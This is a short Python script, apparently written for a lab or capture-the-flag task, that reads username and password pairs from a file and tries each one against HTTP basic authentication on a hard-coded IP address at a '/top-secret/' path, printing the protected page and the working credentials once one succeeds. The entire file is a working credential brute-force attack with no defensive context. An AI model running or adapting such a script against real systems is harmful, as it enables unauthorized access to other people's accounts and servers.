import pwgen
import requests

combination_list = pwgen.load_password_file("passwords.txt", ":")
print(combination_list)

for (x, y) in combination_list:
    response = requests.get("http://104.236.109.232/top-secret/", auth=(x, y))
    if response.status_code == 200:
        print(response.text)
        print("username: " + x)
        print("password: " + y)
        break


